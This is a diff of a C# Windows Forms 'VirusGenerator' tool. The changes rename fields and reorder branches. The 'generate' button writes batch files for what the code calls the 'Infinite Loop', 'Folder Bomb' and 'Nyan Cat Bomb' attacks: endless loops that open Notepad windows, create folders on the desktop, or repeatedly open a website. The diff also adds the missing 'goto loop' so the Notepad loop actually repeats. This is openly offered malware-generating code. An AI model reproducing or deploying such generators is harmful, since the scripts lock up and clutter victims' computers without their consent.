@@ -39,50 +39,50 @@ namespace VirusGenerator
     {
         
         string _outputFolder;
-        string file_name;
-        string fileExt;
+        string _fileName;
+        string _fileExt;
         public Troy()
         {
             InitializeComponent();
             MessageBox.Show("Warning: This program generates actual viruses that CAN and WILL damage your computer if you don't know what you are doing. Use at your own risk.", "WARNING!!!");
         }
-
+        /// <summary>
+        /// Purpose: When clicked, the 'generate' button writes a bunch of text to file and saves it with whatever format the user specified.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void BtnGen_Click(object sender, EventArgs e)
         {
-            _outputFolder = @TxtBoxDes.Text; 
-            file_name     = TxtBoxFileName.Text;
-            fileExt       = CBoxFor.Text;
+            // Init variables
+            _outputFolder = @TxtBoxDes.Text;
+            _fileName = TxtBoxFileName.Text;
+            _fileExt = CBoxFor.Text;
 
-           if (CBoxAttack.Text == "Nyan Cat Bomb Attack") 
+            //Where the magic happens.
+            if (CBoxAttack.Text == "Infinite Loop Attack" && _fileExt == ".bat")
             {
-                if (fileExt == ".bat")
-                {
-                    string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyancat.com", "goto loop" };
-                    System.IO.File.WriteAllLines(_outputFolder + file_name + fileExt, nyanCatCmd);
-                }
-                else
-                {
-                    MessageBox.Show("Unfortunately this attack only works in a '.bat' format. Select that and re-generate.");
-                }
+                string[] infiniteLoopCmd = { "@echo off", ":loop", "start notepad.exe", "goto loop" };
+                System.IO.File.WriteAllLines(_outputFolder + _fileName + _fileExt, infiniteLoopCmd);
             }
-           if (CBoxAttack.Text == "Infinite Loop Attack" && fileExt == ".bat")
-           {
-               string[] infiniteLoopCmd = { "@echo off",":loop", "start notepad.exe"};
-                System.IO.File.WriteAllLines(_outputFolder + file_name + fileExt, infiniteLoopCmd);
-           }
             if (CBoxAttack.Text == "Folder Bomb Attack")
             {
-                
-                string[] folderBombAttackCmd = { "@echo off",  "cd desktop", ":loop", "mkdir virus", "goto loop" };
-                System.IO.File.WriteAllLines(_outputFolder + file_name + fileExt, folderBombAttackCmd);
+
+                string[] folderBombAttackCmd = { "@echo off", "cd desktop", ":loop", "mkdir virus", "goto loop" };
+                System.IO.File.WriteAllLines(_outputFolder + _fileName + _fileExt, folderBombAttackCmd);
+
             }
-           else
+            if (CBoxAttack.Text == "Nyan Cat Bomb Attack")
             {
-                MessageBox.Show("That's not a valid command.");
+                if (_fileExt == ".bat")
+                {
+                    string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyancat.com", "goto loop" };
+                    System.IO.File.WriteAllLines(_outputFolder + _fileName + _fileExt, nyanCatCmd);
+                }
+                else
+                    MessageBox.Show("Unfortunately this attack only works in a '.bat' format. Select that and re-generate.");
             }
-            
 
-
+            ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
         }
 
         public void CBoxFor_SelectedIndexChanged(object sender, EventArgs e)
@@ -90,11 +90,11 @@ namespace VirusGenerator
             string formatSelected = CBoxFor.Text;
             if (formatSelected == ".exe")
             {
-                fileExt = ".exe";
+                _fileExt = ".exe";
             }
             else
             {
-                fileExt = ".bat";
+                _fileExt = ".bat";
             }
 
             ToolStrip.Text = $"Format Selected: '{formatSelected}'"; //Updates tool stip with format
@@ -128,6 +128,11 @@ namespace VirusGenerator
         private void closeToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Close(); //closes program from the menu stip.
+        }
+
+        private void textCompile()
+        {
+
         }
     }
 }
